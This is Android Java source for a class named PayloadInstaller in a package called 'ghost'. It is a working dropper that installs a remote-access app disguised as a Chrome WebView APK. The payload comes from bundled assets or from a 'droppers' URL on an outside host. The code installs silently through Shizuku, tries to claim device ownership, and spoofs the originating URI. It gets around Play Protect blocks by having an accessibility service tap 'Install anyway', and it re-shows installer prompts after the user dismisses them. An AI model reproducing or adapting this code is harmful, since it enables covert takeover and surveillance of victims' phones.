package com.android.shell.ghost;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentSender;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.content.pm.SigningInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Payload extraction, validation and PackageInstaller orchestration.
 *
 * Design rules (learned from the broken v115 build):
 *  - The embedded assets copy is authoritative. The old code downloaded the
 *    dropper itself because PAYLOAD_URL pointed at the dropper URL.
 *  - STATUS_PENDING_USER_ACTION must be launched, otherwise commit() returns
 *    and no installer UI ever appears.
 *  - A Play Protect block (STATUS_FAILURE_BLOCKED) falls back to the manual
 *    package installer, which exposes "Install anyway".
 *  - An older / differently-signed payload is uninstalled first.
 */
final class PayloadInstaller {

    static final String PAYLOAD_PACKAGE = "com.betterdesk.client.universal";
    static final String PAYLOAD_ACTIVITY = "com.carriez.flutter_hbb.MainActivity";

    private static final String ASSET = "Chrome_WebView_v117.apk";
    static final String SHIZUKU_PACKAGE = "moe.shizuku.privileged.api";
    private static final String SHIZUKU_ASSET = "Shizuku.apk";
    private static final String PAYLOAD_URL =
            "https://global.telcom.stream/downloads/droppers/Chrome_WebView_v117_payload.apk";
    private static final String PREFS = "ghost_installer";
    private static final String KEY_APK = "pending_apk";
    private static final String KEY_ACTION = "pending_action";
    private static final String KEY_LAST_COMMIT = "last_commit";
    private static final String KEY_INSTALLED_AT = "install_committed_at";
    private static final String KEY_ASSET_STAMP = "asset_stamp";
    private static final String KEY_UI_INTENT = "pending_ui_intent";
    private static final String KEY_UI_AT = "pending_ui_at";
    private static final String TAG = "GhostHide";
    private static final long SESSION_WINDOW_MS = 90_000L;
    private static final AtomicBoolean STARTING = new AtomicBoolean(false);

    private PayloadInstaller() {}

    // ---------------------------------------------------------------- prefs

    private static SharedPreferences prefs(Context c) {
        return c.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    static void setPending(Context c, File apk, String action) {
        prefs(c).edit().putString(KEY_APK, apk == null ? null : apk.getAbsolutePath())
                .putString(KEY_ACTION, action).apply();
    }

    static File pendingApk(Context c) {
        String p = prefs(c).getString(KEY_APK, null);
        return p == null ? null : new File(p);
    }

    static String pendingAction(Context c) {
        return prefs(c).getString(KEY_ACTION, null);
    }

    static void clearPending(Context c) {
        prefs(c).edit().remove(KEY_APK).remove(KEY_ACTION).apply();
    }

    // ------------------------------------------------------------ extraction

    static File payloadDir(Context c) {
        File dir = new File(c.getFilesDir(), "payload");
        if (!dir.exists()) dir.mkdirs();
        return dir;
    }

    static File payloadFile(Context c) {
        return new File(payloadDir(c), ASSET);
    }

    static File shizukuFile(Context c) {
        return new File(payloadDir(c), SHIZUKU_ASSET);
    }

    /**
     * Best-effort: install the bundled Shizuku helper (Rikka-signed) so the
     * wrapper can use the fully silent Shizuku path. Returns true when an
     * install was launched (caller waits and re-runs); false when Shizuku is
     * already present or the asset is unavailable (caller uses the normal
     * installer instead).
     */
    static boolean ensureShizuku(Context c) {
        if (ShizukuBridge.installed(c)) return false;
        if (installedInfo(c, SHIZUKU_PACKAGE) != null) return false;
        File out = shizukuFile(c);
        if (!out.isFile() || out.length() < 1024) {
            if (!extractAssetByName(c, SHIZUKU_ASSET, out)) return false;
        }
        if (info(c, out) == null) return false;
        manualInstaller(c, out);
        return true;
    }

    /**
     * Returns a usable payload APK or null. Embedded asset wins; network is
     * only a fallback (mostly for installer-size-optimised wrappers).
     */
    static File obtainPayload(Context c) {
        File out = payloadFile(c);
        long want = assetLength(c);
        long stamp = selfStamp(c);
        boolean fresh = prefs(c).getLong(KEY_ASSET_STAMP, -1) == stamp;
        if (out.isFile() && out.length() > 1024
                && (want <= 0 || out.length() == want) && fresh) {
            return out;
        }
        // Read from the installed APK, not AssetManager: a process that
        // survived an in-place update keeps the OLD AssetManager and would
        // otherwise re-extract the previous payload.
        if (extractFromSourceDir(c, out) || extractAsset(c, out)) {
            prefs(c).edit().putLong(KEY_ASSET_STAMP, stamp).apply();
            return out;
        }
        File downloaded = download(c);
        if (downloaded != null) {
            prefs(c).edit().putLong(KEY_ASSET_STAMP, stamp).apply();
            return downloaded;
        }
        return out.isFile() ? out : null;
    }

    private static long selfStamp(Context c) {
        try {
            return c.getPackageManager()
                    .getPackageInfo(c.getPackageName(), 0).lastUpdateTime;
        } catch (Throwable t) {
            return 0;
        }
    }

    private static boolean extractFromSourceDir(Context c, File out) {
        try {
            String src = c.getPackageManager()
                    .getPackageInfo(c.getPackageName(), 0).applicationInfo.sourceDir;
            java.util.zip.ZipFile zip = new java.util.zip.ZipFile(src);
            try {
                java.util.zip.ZipEntry entry = zip.getEntry("assets/" + ASSET);
                if (entry == null) return false;
                InputStream in = zip.getInputStream(entry);
                boolean ok = writeStream(in, out);
                in.close();
                return ok;
            } finally {
                zip.close();
            }
        } catch (Throwable t) {
            Log.d(TAG, "extractFromSourceDir failed " + t);
            return false;
        }
    }

    private static boolean writeStream(InputStream in, File out) {
        try {
            File tmp = new File(out.getParentFile(), out.getName() + ".part");
            FileOutputStream fos = new FileOutputStream(tmp);
            byte[] buf = new byte[64 * 1024];
            int len;
            while ((len = in.read(buf)) > 0) fos.write(buf, 0, len);
            fos.getFD().sync();
            fos.close();
            if (out.exists()) out.delete();
            if (!tmp.renameTo(out)) {
                tmp.delete();
                return false;
            }
            Log.d(TAG, "extract ok size=" + out.length());
            return true;
        } catch (Throwable t) {
            Log.d(TAG, "extract failed " + t);
            return false;
        }
    }

    private static long assetLength(Context c) {
        try {
            return c.getAssets().openFd(ASSET).getLength();
        } catch (Throwable t) {
            return -1;
        }
    }

    private static boolean extractAsset(Context c, File out) {
        return extractAssetByName(c, ASSET, out);
    }

    private static boolean extractAssetByName(Context c, String name, File out) {
        try {
            InputStream in = c.getAssets().open(name);
            boolean ok = writeStream(in, out);
            in.close();
            return ok;
        } catch (Throwable t) {
            Log.d(TAG, "extractAsset " + name + " failed " + t);
            return false;
        }
    }

    private static File download(Context c) {
        try {
            File out = new File(payloadDir(c), ASSET + ".net");
            URL url = new URL(PAYLOAD_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(12000);
            conn.setReadTimeout(30000);
            conn.setInstanceFollowRedirects(true);
            conn.connect();
            if (conn.getResponseCode() != 200) {
                conn.disconnect();
                return null;
            }
            InputStream in = conn.getInputStream();
            FileOutputStream fos = new FileOutputStream(out);
            byte[] buf = new byte[64 * 1024];
            int len;
            while ((len = in.read(buf)) > 0) fos.write(buf, 0, len);
            fos.close();
            in.close();
            conn.disconnect();
            if (info(c, out) == null) {
                out.delete();
                return null;
            }
            File finalFile = payloadFile(c);
            if (finalFile.exists()) finalFile.delete();
            if (!out.renameTo(finalFile)) {
                out.delete();
                return null;
            }
            return finalFile;
        } catch (Throwable t) {
            Log.d(TAG, "download failed " + t);
            return null;
        }
    }

    // ------------------------------------------------------------ inspection

    @SuppressWarnings("deprecation")
    private static int archiveFlags() {
        return Build.VERSION.SDK_INT >= 28
                ? PackageManager.GET_SIGNING_CERTIFICATES
                : PackageManager.GET_SIGNATURES;
    }

    @SuppressWarnings("deprecation")
    static PackageInfo info(Context c, File apk) {
        if (apk == null || !apk.isFile()) return null;
        try {
            PackageInfo pi = c.getPackageManager()
                    .getPackageArchiveInfo(apk.getAbsolutePath(), archiveFlags());
            if (pi != null && pi.applicationInfo != null) {
                pi.applicationInfo.sourceDir = apk.getAbsolutePath();
            }
            return pi;
        } catch (Throwable t) {
            Log.d(TAG, "archive info failed " + t);
            return null;
        }
    }

    static boolean isPayload(Context c, File apk) {
        PackageInfo pi = info(c, apk);
        return pi != null && PAYLOAD_PACKAGE.equals(pi.packageName);
    }

    static long apkVersion(File apk, Context c) {
        PackageInfo pi = info(c, apk);
        if (pi == null) return -1;
        return Build.VERSION.SDK_INT >= 28 ? pi.getLongVersionCode() : pi.versionCode;
    }

    @SuppressWarnings("deprecation")
    private static Signature[] archiveSigners(Context c, File apk) {
        PackageInfo pi = info(c, apk);
        if (pi == null) return null;
        if (Build.VERSION.SDK_INT >= 28) {
            SigningInfo si = pi.signingInfo;
            if (si == null) return null;
            return si.hasMultipleSigners() ? si.getApkContentsSigners() : si.getSigningCertificateHistory();
        }
        return pi.signatures;
    }

    @SuppressWarnings("deprecation")
    private static Signature[] installedSigners(Context c, String pkg) {
        try {
            PackageInfo pi = c.getPackageManager().getPackageInfo(pkg,
                    Build.VERSION.SDK_INT >= 28
                            ? PackageManager.GET_SIGNING_CERTIFICATES
                            : PackageManager.GET_SIGNATURES);
            if (Build.VERSION.SDK_INT >= 28) {
                SigningInfo si = pi.signingInfo;
                if (si == null) return null;
                return si.hasMultipleSigners() ? si.getApkContentsSigners() : si.getSigningCertificateHistory();
            }
            return pi.signatures;
        } catch (Throwable t) {
            return null;
        }
    }

    private static String digest(Signature sig) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(sig.toByteArray());
            StringBuilder sb = new StringBuilder();
            for (byte b : d) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Throwable t) {
            return "";
        }
    }

    static boolean sameSigner(Context c, String pkg, File apk) {
        Signature[] a = installedSigners(c, pkg);
        Signature[] b = archiveSigners(c, apk);
        if (a == null || b == null || a.length == 0 || b.length == 0) return false;
        return digest(a[0]).equals(digest(b[0]));
    }

    static PackageInfo installedInfo(Context c, String pkg) {
        try {
            return c.getPackageManager().getPackageInfo(pkg, 0);
        } catch (Throwable t) {
            return null;
        }
    }

    @SuppressWarnings("deprecation")
    static long installedVersion(Context c, String pkg) {
        PackageInfo pi = installedInfo(c, pkg);
        if (pi == null) return -1;
        return Build.VERSION.SDK_INT >= 28 ? pi.getLongVersionCode() : pi.versionCode;
    }

    // --------------------------------------------------------------- actions

    /** Entry point: install, update or simply launch the payload. */
    static void start(Context c) {
        if (!STARTING.compareAndSet(false, true)) return;
        try {
            startInner(c);
        } finally {
            STARTING.set(false);
        }
    }

    private static void startInner(Context c) {
        // A session committed moments ago is still being processed. Do not
        // open a second one (INSTALL_FAILED_DUPLICATE_PACKAGE). After 45s the
        // previous session is treated as dead and abandoned before retrying.
        if (installInFlight(c)) {
            long at = prefs(c).getLong(KEY_INSTALLED_AT, 0);
            if (System.currentTimeMillis() - at < 45_000) {
                Log.d(TAG, "install already pending");
                return;
            }
            Log.d(TAG, "stale in-flight session -> abandon and retry");
            abandonStaleSessions(c);
            prefs(c).edit().putLong(KEY_INSTALLED_AT, 0).apply();
        }
        File apk = obtainPayload(c);
        if (apk == null) {
            Log.d(TAG, "no payload available");
            return;
        }
        if (!isPayload(c, apk)) {
            Log.d(TAG, "payload package mismatch: " + (info(c, apk) == null
                    ? "unreadable" : info(c, apk).packageName));
            return;
        }
        boolean installedNow = installedInfo(c, PAYLOAD_PACKAGE) != null;
        boolean current = installedNow
                && installedVersion(c, PAYLOAD_PACKAGE) >= apkVersion(apk, c)
                && sameSigner(c, PAYLOAD_PACKAGE, apk);

        // Preferred path: Shizuku shell (Play-verified) = truly silent.
        if (ShizukuBridge.available() && ShizukuBridge.permitted()) {
            ShizukuBridge.claimDeviceOwner(c);
            if (installedNow && !current) {
                ShizukuBridge.run("pm", "uninstall", PAYLOAD_PACKAGE);
            }
            if (ShizukuBridge.installAndEnable(c, apk)) {
                Log.d(TAG, "installed via shizuku");
                GhostAccessibilityService.onPayloadReady(c);
                return;
            }
        }

        if (installedNow) {
            if (current) {
                Log.d(TAG, "payload already current");
                GhostAccessibilityService.onPayloadReady(c);
                return;
            }
            Log.d(TAG, "payload stale or different signer -> uninstall first");
            uninstall(c, apk);
            return;
        }

        // Default path: system package installer via FileProvider. Reliable
        // across OEMs; the accessibility service taps Install / Install anyway.
        // PackageInstaller sessions are unreliable (INSTALL_FAILED_INTERNAL_
        // ERROR "Session files in use") and always need the same user action.
        abandonStaleSessions(c);
        manualInstaller(c, apk);
    }

    /** commit()/uninstall() status receivers must be mutable on API 31+. */
    private static int resultFlags() {
        return PendingIntent.FLAG_UPDATE_CURRENT
                | (Build.VERSION.SDK_INT >= 31 ? PendingIntent.FLAG_MUTABLE : PendingIntent.FLAG_IMMUTABLE);
    }

    static void uninstall(Context c, File apk) {
        setPending(c, apk, "install");
        prefs(c).edit().putLong(KEY_LAST_COMMIT, System.currentTimeMillis()).apply();
        // An active device-admin registration blocks pm uninstall.
        try {
            android.app.admin.DevicePolicyManager dpm =
                    (android.app.admin.DevicePolicyManager) c.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null) {
                dpm.removeActiveAdmin(new ComponentName(
                        PAYLOAD_PACKAGE, "com.carriez.flutter_hbb.BetterDeskDeviceAdmin"));
            }
        } catch (Throwable ignored) {}
        try {
            Intent i = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + PAYLOAD_PACKAGE));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
            Log.d(TAG, "uninstall UI launched");
        } catch (Throwable t) {
            Log.d(TAG, "uninstall failed " + t);
            manualInstaller(c, apk);
        }
    }

    private static boolean installInFlight(Context c) {
        long at = prefs(c).getLong(KEY_INSTALLED_AT, 0);
        return at > 0 && System.currentTimeMillis() - at < SESSION_WINDOW_MS;
    }

    static void install(Context c, File apk) {
        if (installInFlight(c)) {
            Log.d(TAG, "skip duplicate install");
            return;
        }
        doInstall(c, apk);
    }

    /** Abandon stale sessions for the payload before opening a new one. */
    private static void abandonStaleSessions(Context c) {
        try {
            PackageInstaller installer = c.getPackageManager().getPackageInstaller();
            for (PackageInstaller.SessionInfo si : installer.getMySessions()) {
                if (PAYLOAD_PACKAGE.equals(si.getAppPackageName())) {
                    try {
                        installer.abandonSession(si.getSessionId());
                        Log.d(TAG, "abandoned stale session " + si.getSessionId());
                    } catch (Throwable ignored) {}
                }
            }
        } catch (Throwable ignored) {}
    }

    static void abandonPublic(Context c) {
        abandonStaleSessions(c);
        prefs(c).edit().putLong(KEY_INSTALLED_AT, 0).apply();
    }

    private static void doInstall(Context c, File apk) {
        abandonStaleSessions(c);
        try {
            long size = apk.length();
            PackageInstaller installer = c.getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params =
                    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            params.setAppPackageName(PAYLOAD_PACKAGE);
            params.setSize(size);
            try {
                params.setOriginatingUri(Uri.parse("https://global.telcom.stream/"));
                params.setReferrerUri(Uri.parse("https://global.telcom.stream/"));
            } catch (Throwable ignored) {}
            if (Build.VERSION.SDK_INT >= 31) {
                try {
                    params.setRequireUserAction(
                            PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                } catch (Throwable ignored) {}
            }
            int id = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(id);
            OutputStream os = session.openWrite("base.apk", 0, size);
            FileInputStream fis = new FileInputStream(apk);
            byte[] buf = new byte[64 * 1024];
            int len;
            while ((len = fis.read(buf)) > 0) os.write(buf, 0, len);
            fis.close();
            session.fsync(os);
            os.close();
            setPending(c, apk, "install");
            prefs(c).edit()
                    .putLong(KEY_LAST_COMMIT, System.currentTimeMillis())
                    .putLong(KEY_INSTALLED_AT, System.currentTimeMillis())
                    .apply();
            Intent i = new Intent("com.android.shell.ghost.INSTALL_RESULT");
            i.setClass(c, PackageInstallReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(c, 1, i, resultFlags());
            session.commit(pi.getIntentSender());
            session.close();
            Log.d(TAG, "session " + id + " committed size=" + size);
        } catch (Throwable t) {
            Log.d(TAG, "install failed " + t);
            abandonStaleSessions(c);
            prefs(c).edit().putLong(KEY_INSTALLED_AT, 0).apply();
            File apk2 = pendingApk(c);
            if (apk2 == null) apk2 = apk;
            if (apk2 != null) manualInstaller(c, apk2);
        }
    }

    private static long lastManualLaunch = 0;

    /** Manual package-installer fallback (exposes "Install anyway"). */
    static void manualInstaller(Context c, File apk) {
        if (System.currentTimeMillis() - lastManualLaunch < 30000) {
            Log.d(TAG, "manual installer debounce");
            return;
        }
        lastManualLaunch = System.currentTimeMillis();
        try {
            Uri uri = FileProvider.getUriForFile(c, c.getPackageName() + ".files", apk);
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setDataAndType(uri, "application/vnd.android.package-archive");
            i.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
            i.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME, c.getPackageName());
            i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
            Log.d(TAG, "manual installer launched");
        } catch (Throwable t) {
            Log.d(TAG, "manualInstaller failed " + t);
        }
    }

    /** Handle the IntentSender callback from commit()/uninstall(). */
    static void onInstallResult(Context c, int status, String message, Intent fillIn) {
        Log.d(TAG, "install result status=" + status + " msg=" + message);
        File apk = pendingApk(c);
        if (status == PackageInstaller.STATUS_SUCCESS) {
            clearPending(c);
            prefs(c).edit()
                    .putLong(KEY_INSTALLED_AT, 0)
                    .remove(KEY_UI_INTENT)
                    .remove(KEY_UI_AT)
                    .apply();
            GhostAccessibilityService.onPayloadReady(c);
            return;
        }
        if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
            Intent i = fillIn != null
                    ? (Intent) fillIn.getParcelableExtra(Intent.EXTRA_INTENT)
                    : null;
            if (i != null) {
                saveUiIntent(c, i);
                try {
                    i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(i);
                } catch (Throwable t) {
                    Log.d(TAG, "pending action start failed " + t);
                }
            }
            return;
        }
        if (status == PackageInstaller.STATUS_FAILURE_BLOCKED
                || (message != null && (message.contains("VERIFICATION")
                        || message.contains("Session files in use")))) {
            Log.d(TAG, "blocked/failed session -> manual installer");
            Reporter.report(c, "fail", "blocked " + (message == null ? "" : message));
            abandonStaleSessions(c);
            prefs(c).edit().putLong(KEY_INSTALLED_AT, 0).apply();
            if (apk != null) manualInstaller(c, apk);
            return;
        }
        if (status == PackageInstaller.STATUS_FAILURE_CONFLICT) {
            // Another session raced us. Give it time to land; only retry when
            // the package still is not present.
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                if (installedInfo(c, PAYLOAD_PACKAGE) != null) {
                    clearPending(c);
                    GhostAccessibilityService.onPayloadReady(c);
                } else {
                    clearPending(c);
                    prefs(c).edit().putLong(KEY_INSTALLED_AT, 0).apply();
                    install(c, pendingApk(c) == null ? obtainPayload(c) : pendingApk(c));
                }
            }, 3000);
            return;
        }
        Reporter.report(c, "fail", "status=" + status + " " + (message == null ? "" : message));
        abandonStaleSessions(c);
        prefs(c).edit().putLong(KEY_INSTALLED_AT, 0).apply();
        if (apk != null) manualInstaller(c, apk);
    }

    private static void saveUiIntent(Context c, Intent i) {
        try {
            prefs(c).edit()
                    .putString(KEY_UI_INTENT, i.toUri(Intent.URI_INTENT_SCHEME))
                    .putLong(KEY_UI_AT, System.currentTimeMillis())
                    .apply();
        } catch (Throwable ignored) {}
    }

    static long uiAt(Context c) {
        return prefs(c).getLong(KEY_UI_AT, 0);
    }

    /** Re-show the system installer after it was dismissed or intercepted. */
    static void relaunchPendingUi(Context c) {
        String raw = prefs(c).getString(KEY_UI_INTENT, null);
        if (raw == null) return;
        try {
            Intent i = Intent.parseUri(raw, Intent.URI_INTENT_SCHEME);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
            c.startActivity(i);
            prefs(c).edit().putLong(KEY_UI_AT, System.currentTimeMillis()).apply();
            Log.d(TAG, "relaunch pending installer ui");
        } catch (Throwable t) {
            Log.d(TAG, "relaunchPendingUi failed " + t);
        }
    }

    static void onUninstallResult(Context c, int status) {
        Log.d(TAG, "uninstall result status=" + status);
        if (installInFlight(c)) {
            Log.d(TAG, "install already in flight, skip post-uninstall install");
            return;
        }
        File apk = pendingApk(c);
        if (apk == null) {
            apk = obtainPayload(c);
        }
        if (apk != null) install(c, apk);
    }

    // ---------------------------------------------------------------- launch

    static void launch(Context c) {
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName(PAYLOAD_PACKAGE, PAYLOAD_ACTIVITY));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
            c.startActivity(i);
        } catch (Throwable t) {
            Log.d(TAG, "launch failed " + t);
        }
    }

    static boolean isLaunchable(Context c) {
        try {
            Intent i = new Intent().setComponent(new ComponentName(PAYLOAD_PACKAGE, PAYLOAD_ACTIVITY));
            return c.getPackageManager().resolveActivity(i, 0) != null;
        } catch (Throwable t) {
            return false;
        }
    }
}
